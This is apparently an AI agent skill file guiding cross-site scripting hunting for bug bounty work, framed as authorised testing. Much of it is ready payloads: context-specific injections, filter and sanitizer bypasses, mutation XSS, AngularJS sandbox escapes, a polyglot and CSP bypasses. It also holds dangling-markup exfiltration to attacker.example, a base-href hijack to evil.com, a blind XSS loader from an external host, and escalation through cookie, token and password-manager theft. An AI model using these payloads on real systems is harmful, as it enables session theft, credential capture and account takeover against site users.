---
name: xss-testing
description: "Cross-site scripting hunting across reflected, stored, and blind XSS — reflection context analysis (HTML body, attribute, JS string, template literal, URL, CSS), client-side template injection and AngularJS sandbox escape, filter and sanitizer bypass, mutation XSS, dangling markup exfiltration when execution is blocked, CSP bypass including policy injection, and escalation from alert() to session theft, password-manager capture, or admin ATO. Use when any user input is echoed back into a response, when testing search/error/profile/comment/upload-metadata fields, or when a previous XSS sweep only tried a bare script-tag payload and gave up on the first filter."
---

# Cross-Site Scripting (XSS)

`<script>alert(1)</script>` failing tells you almost nothing. XSS is won or lost on **context** — where exactly your input lands in the response, and what characters that position needs in order to break out. Almost every missed XSS in this project came from firing a generic payload, seeing it encoded, and moving on without ever asking which context the reflection was in.

The method is always the same three steps: find a reflection, identify its context, then craft the minimum payload that escapes that specific context.

> DOM XSS (source-to-sink inside client JS, no server involvement) is a different hunt with different tooling — go to `dom-based-vulnerabilities`.

## Crown Jewel Targets

- **Admin panels and support/back-office consoles** — stored XSS where a support agent views attacker-supplied content is admin ATO, the highest-severity XSS outcome
- **Multi-tenant SaaS with shared domains** — stored XSS on one tenant reaching another tenant's users crosses a trust boundary the vendor cares about
- **Comment, review, ticket, and chat features** — the classic stored XSS surface; check every field that renders rich text or preserves formatting
- **File upload metadata** — filenames, EXIF, SVG contents and PDF titles are frequently echoed into HTML with no encoding
- **Error and 404 pages** — often rendered by a different, older template path that skips the framework's auto-escaping
- **Email templates and notification previews** — server-rendered HTML with weaker sanitization than the main app
- **Legacy pages behind a modern SPA** — the React front end escapes correctly; the ten-year-old JSP/ASP report page behind it does not
- **Blind XSS surfaces** — contact forms, job applications, abuse reports, user-agent logging. Nothing reflects to you, so plant an XSS Hunter payload and walk away

## Attack Surface Signals

- **Reflection anywhere**: send a unique canary (`zqx7k1`) into every parameter, header, and cookie, then grep every response for it — including error pages and JSON
- **Encoding tells**: canary comes back as `zqx7k1` (raw — promising), `&lt;` (HTML-encoded), `<` (JS-encoded), `%3C` (URL-encoded). Each tells you which filter you are up against
- **Content-Type matters**: `text/html` is exploitable; `application/json` usually is not unless the browser sniffs it or it is later injected into the DOM
- **Framework signals**: auto-escaping frameworks (React, Django, Rails, Twig) push XSS toward `dangerouslySetInnerHTML`, `|safe`, `html_safe`, `|raw` — grep source and JS bundles for these
- **CSP header present**: read it before testing; it changes which payloads can ever work and may itself be bypassable
- **Legacy stack signals**: Classic ASP, JSP, PHP without a templating layer, `document.write` in server-rendered HTML

## The Three Types

| Type | Where the payload lives | How it fires | Typical severity |
|---|---|---|---|
| **Reflected** | In the request; echoed into the immediate response | Victim follows an attacker-crafted link | Medium (needs interaction) — High if it hits an authenticated area |
| **Stored** | Persisted server-side | Fires for every user who views the resource | High — Critical if an admin or support agent is the viewer |
| **Blind** | Persisted somewhere you cannot see | Fires in an internal tool, log viewer, or admin dashboard | High — Critical, and usually the highest-value XSS on a mature target |

Blind XSS is the one most often skipped, and on well-tested programs it is frequently the only XSS left. Plant payloads early in an engagement so they have time to fire.

## Context Analysis — the core of the method

Send the canary, find it in the response, and read what surrounds it. The context dictates the payload.

### 1. HTML body context
```html
<div>CANARY</div>
```
Nothing to escape — inject a tag directly. Use event handlers rather than `<script>`, since many filters block only `script`:
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
```

### 2. HTML attribute context
```html
<input value="CANARY">
```
Break out of the quote first, then either close the tag or add a handler in place:
```html
"><img src=x onerror=alert(1)>
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) x="
```
If quotes are encoded but the attribute is unquoted (`<input value=CANARY>`), a space is enough:
```html
x onfocus=alert(1) autofocus
```

### 3. JavaScript string context
```html
<script>var q = "CANARY";</script>
```
Close the string and the statement, then comment out the remainder:
```javascript
";alert(1)//
';alert(1)//
</script><img src=x onerror=alert(1)>
```
That third payload matters: **the HTML parser runs before the JS parser**, so `</script>` terminates the block even inside a string literal. It is the single most reliable escape from JS string context, and it survives backslash-escaping of quotes.

If backslashes are escaped but quotes are not, or vice versa, test both — `\` and `"` are handled by different code paths surprisingly often.

### 4. Template literal context
```html
<script>var msg = `Hello CANARY`;</script>
```
No quote break needed — `${}` executes inside the literal:
```javascript
${alert(1)}
${alert(document.domain)}
```

### 5. Inline event handler context
```html
<a onclick="showUser('CANARY')">
```
The value is HTML-decoded before JS parsing, so HTML entities become live syntax:
```javascript
&apos;);alert(1)//
&#39;);alert(1)//
```
This is why "quotes are HTML-encoded" is not a fix in this context.

### 6. URL / href context
```html
<a href="CANARY">
```
```
javascript:alert(1)
javascript&colon;alert(1)
java%09script:alert(1)
data:text/html,<script>alert(1)</script>
```
Note `javascript:` in an `href` requires a click; in `<iframe src>` or `location` it fires automatically.

### 7. Client-side template injection (CSTI)

When the app uses a client-side template framework and drops your input into the page, the framework itself evaluates it — no HTML tags required. Test with `{{7*7}}` and look for `49`.

AngularJS is the case worth knowing, because its **sandbox is not a security boundary** and the escapes are well documented. Basic escape:
```javascript
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

Against the sandbox proper, the classic trick redefines `charAt` globally so AngularJS's `isIdent()` check treats every character as an identifier:
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```
`$eval()` is needed because the overwritten `charAt` only takes effect once the sandbox re-parses.

If quotes are filtered, build characters with `String.fromCharCode()`. If `$eval` is undefined, use the `orderBy` filter instead — `|` is a filter operator in AngularJS, not bitwise OR:
```javascript
[123]|orderBy:'SOME_EXPRESSION'
```

With CSP active, AngularJS parses expressions differently and avoids the `Function` constructor, so the standard escape dies. Use AngularJS's own events plus `$event`:
```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```
`from()` is used because calling `alert` directly would be caught; passing it as the mapper hides the `window` reference. Under a length restriction, the same idea shrinks to:
```javascript
[1].map(alert)
```

### 8. CSS context
```html
<style>body { color: CANARY }</style>
```
Modern browsers killed `expression()`, so CSS context is mostly useful for data exfiltration (attribute selectors leaking CSRF tokens character by character) rather than script execution. Do not spend long here unless you can also inject a `</style>` to escape into HTML.

## Filter and sanitizer bypass

Work out *what* is blocked before trying to bypass it. Submit each character and tag separately and note which get through — a blocklist that permits `<svg>` but blocks `<script>` needs a completely different approach from one that strips `(` and `)`.

**Tag/handler blocklists**
```html
<sVg OnLoad=alert(1)>                  case variation
<svg/onload=alert(1)>                  slash instead of space
<svg%09onload=alert(1)>                tab, newline, form feed as separators
<img src=x onerror=alert(1)//          unclosed tag
<<script>alert(1)//<</script>          double bracket eats one filter pass
```

**Parentheses blocked**
```javascript
alert`1`                               tagged template literal
onerror=alert;throw 1                  throw supplies the argument
setTimeout`alert(1)`
```

**Keyword blocked (`alert`, `document`, `cookie`)**
```javascript
window['al'+'ert'](1)
self[atob('YWxlcnQ=')](1)
top['alert'](1)
```

**Encoding layers** — try each, and combinations:
- double URL encoding (`%253Cscript%253E`) where a proxy decodes once and the app decodes again
- HTML entities in attribute context (`&lt;` becoming `<` after decode)
- unicode escapes in JS context (`alert`)
- overlong UTF-8 and fullwidth characters against naive filters (see `windows-unicode-attacks` for the ANSI conversion variant)

**Mutation XSS (mXSS)** — the payload is safe when the sanitizer sees it and becomes dangerous after the browser re-parses it. This is the main way DOMPurify and similar libraries get beaten:
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```
Check the sanitizer's version against its published CVEs first — an outdated DOMPurify is a much faster win than hand-crafting mutations.

**Polyglots** — useful for a first sweep across many parameters when you do not yet know the context:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
Treat a polyglot hit as a signal to go back and do proper context analysis — never as the final PoC.

## Dangling markup injection — when XSS is blocked but injection is not

If you can break out of an attribute and back into HTML but filters or CSP stop script execution, you can still steal data. Leave an attribute **unterminated** so the browser swallows the rest of the response as part of the URL:

```html
"><img src='//attacker.example?
```

The browser looks ahead for the next single quote to close `src`, sending everything in between — CSRF tokens, email bodies, account data — to your server. Any attribute that makes an external request works, so `img-src 'self'` does not close this off (try an anchor with a dangling `href` instead).

Two constraints worth knowing before you write this up:
- **Chrome blocks raw newlines and angle brackets in URLs** as a built-in dangling-markup mitigation, so captured data containing markup often kills the request. Confirm in the browser, not in curl.
- Where all external requests are blocked, the fallback is a tag that **stores** the data and sends it on user interaction — which means the PoC needs a plausible interaction story.

This technique is the reason "CSP blocks XSS here" is not the end of the assessment.

## CSP bypass

Read the policy before concluding XSS is unexploitable. Common openings:

- **`unsafe-inline`** present — no bypass needed
- **Whitelisted CDN hosting a JSONP endpoint or an old AngularJS** — a CDN without per-customer URLs (`ajax.googleapis.com` is the canonical example) lets you load a library and pivot: `<script src="https://cdn.example/angular.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`
- **`unsafe-eval`** with a gadget library on the page — reach `Function` or `eval` through it
- **Policy injection** — if a parameter is reflected *into the policy itself* (usually the trailing `report-uri` directive), inject `;` to append your own directives. `script-src` normally cannot be overwritten, but **`script-src-elem` can override an existing `script-src`** for script elements, which is the practical way in
- **Nonce reuse across responses** — if the nonce is static or predictable, reuse it
- **Whitelisted domain that is unregistered or dangling** — that is a takeover, see `csp-bypass`
- **No `base-uri`** — inject `<base href="//evil.com">` and every relative script path now loads from you
- **`img-src` still permissive** — CSPs commonly block `script` but allow images, which keeps dangling markup exfiltration alive even when execution is dead

## Escalation — turning alert(1) into a finding

`alert(1)` proves execution; it does not prove impact, and on its own it invites a low rating. Push to one of these:

| Escalation | Proof to capture |
|---|---|
| Session theft | Exfiltrate `document.cookie` to a collaborator host — only works without `HttpOnly` |
| Authenticated action | Fire a state-changing request as the victim (change email, add admin user) using their session |
| Token theft | Read a bearer token from `localStorage`/`sessionStorage` and use it against the API |
| Account takeover | Chain to a password/email change endpoint; capture the resulting login |
| Admin compromise | Stored/blind XSS firing in an admin or support view — screenshot the internal UI |
| Password capture | Inject a fake login form; the victim's **browser password manager autofills it**, then read the values back. Stronger than a phishing overlay because it needs no typing |
| CSRF protection bypass | Use the XSS to read the anti-CSRF token from the page, then submit the state-changing request with it — the token defence is void once you have script execution in-origin |

`HttpOnly` on the session cookie kills cookie theft but not the XSS — pivot to performing actions as the victim instead of stealing the session. Note that cookie theft also depends on the victim being logged in and needs an out-of-band collector, which is why token theft and in-page actions are usually the more reliable proof.

Self-XSS is not reportable until you can make a victim trigger it — go to `dom-based-vulnerabilities` → `references/self-xss-escalation.md`.

## Detection and tooling

```bash
# 1. Canary sweep — every param, header, cookie; grep all responses including errors
ffuf -w params.txt -u 'https://target/page?FUZZ=zqx7k1' -mr 'zqx7k1'

# 2. Parameter discovery first — you cannot test what you have not found
arjun -u https://target/page

# 3. Context-aware scanning
dalfox url https://target/page?q=test --custom-payload payloads.txt
# XSStrike does context detection and picks payloads accordingly
```

- **Burp**: Scanner finds reflections quickly; use Repeater for the context work and Intruder for character-by-character filter mapping. Turbo Intruder for large parameter sets.
- **Blind XSS**: plant `"><script src=https://YOURID.xss.ht></script>` (XSS Hunter or your own collaborator) in every free-text field — name, address, user-agent, referrer, support ticket body — and record where each was planted so a callback can be traced back to its entry point.
- **Real browser confirmation is mandatory.** A payload that looks correct in curl output may be neutralised by the browser's parser or by a framework hook. Confirm in Playwright or Burp's embedded browser before writing anything up.

## Impact Requirements

**Reflection alone is not a finding.** What is required:

| Finding | Required proof | Severity |
|---|---|---|
| Stored XSS in admin/support view | Execution captured in the privileged context | Critical |
| Stored XSS, user-to-user | Execution in a second account's browser | High |
| Blind XSS callback | Callback with DOM/screenshot proving where it fired | High–Critical |
| Reflected XSS, authenticated area | Working URL + browser execution + an impact action | Medium–High |
| Reflected XSS, unauthenticated page | Working URL + browser execution | Low–Medium |
| XSS behind CSP with a working bypass | Full chain including the CSP bypass step | As above, unchanged |
| Client-side template injection | Sandbox escape executing script, not just `{{7*7}}` returning 49 | As per reflected/stored |
| Dangling markup exfiltration | Captured response data (CSRF token, PII) received on your host, confirmed in a real browser | Medium–High |

**Not reportable:**
- Self-XSS with no escalation path
- Execution only in a browser nobody ships (IE-only vectors, `document.domain` tricks needing legacy engines)
- Reflection that is correctly encoded in its context
- `alert(1)` on a static page with no session, no data, and no privileged viewer
- XSS requiring a victim to paste content into DevTools

## Triage Checklist

- [ ] Reflection located and the surrounding context identified precisely (body / attribute / JS string / template literal / handler / URL / CSS)
- [ ] Payload derived from that context, not from a generic list
- [ ] Execution confirmed in a real browser (Playwright or Burp embedded), not inferred from response text
- [ ] Reproduced 2–3 times — intermittent execution usually means a cache or a race, not XSS
- [ ] CSP read and, if present, the bypass documented as part of the chain
- [ ] Stored XSS verified from a **second account** to prove it crosses users
- [ ] Blind XSS callback includes the firing URL or DOM so the entry point is provable
- [ ] Impact escalated past `alert(1)` and the escalating request captured
- [ ] Self-XSS ruled out — no victim-side pasting or console use required
- [ ] Scope confirmed: the vulnerable host is genuinely in scope

## Operator Notes (Battle-Tested)

1. **Identify the context before choosing a payload.** A single canary and a careful read of the surrounding bytes beats a thousand payloads from a list. Most "not vulnerable" verdicts in this project were context misreads.
2. **`</script>` escapes JS string context even when quotes are escaped** — the HTML parser wins over the JS parser. Try it before concluding a JS-context reflection is safe.
3. **Plant blind XSS payloads on day one.** They need time to fire, and on mature programs the internal admin tool is where the last remaining XSS lives. Log every planting location so a callback can be attributed.
4. **Fragment-delivered payloads bypass the WAF entirely** — anything after `#` never reaches the server. If the sink reads from the fragment, no server-side filter is in play (that hunt lives in `dom-based-vulnerabilities`).
5. **Check the sanitizer version before inventing mutations.** DOMPurify, sanitize-html, and friends have well-documented bypass CVEs; an outdated version in a JS bundle is far faster than hand-rolling mXSS.
6. **Error pages and legacy routes are the soft spots on modern stacks.** The SPA escapes properly; the old server-rendered report or export page behind it usually does not.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Reflection is inside client JS, no server echo | `dom-based-vulnerabilities` |
| Payload blocked by a WAF, not by the app | `waf-bypass` |
| CSP blocking execution, whitelist looks weak | `csp-bypass` |
| Need to find the parameter that reflects at all | `hidden-param-discovery` |
| XSS found but self-only | `dom-based-vulnerabilities` → `references/self-xss-escalation.md` |
| Reflection lands in a response header | `crlf-injection` |
| XSS usable to defeat anti-CSRF protection | `csrf-testing` |
| Server-side template engine evaluates the input | `ssti-testing` |
| Prototype pollution gadget produces the XSS | `prototype-pollution` |
| XSS served from a poisoned cache entry | `cache-poisoning` |

---

## Skill metadata

- **Pattern**: Cross-Site Scripting (Reflected / Stored / Blind)
- **Severity**: Medium-Critical
- **Tech**: generic, php, java, aspnet, nodejs, django, rails, react, angular, vue
- **Triggers**: `/test-xss`, `xss`, `cross site scripting`, `reflected xss`, `stored xss`, `blind xss`, `xss filter bypass`, `mutation xss`, `mxss`, `csp bypass xss`, `xss polyglot`, `client side template injection`, `csti`, `angularjs sandbox escape`, `dangling markup`
- **Related skills**: dom-based-vulnerabilities, waf-bypass, csp-bypass, hidden-param-discovery, csrf-testing, crlf-injection, prototype-pollution, cache-poisoning
- **Sources**: portswigger-academy (cross-site-scripting: reflected, stored, contexts, client-side-template-injection, dangling-markup, content-security-policy, exploiting, cheat-sheet), hackerone-reports
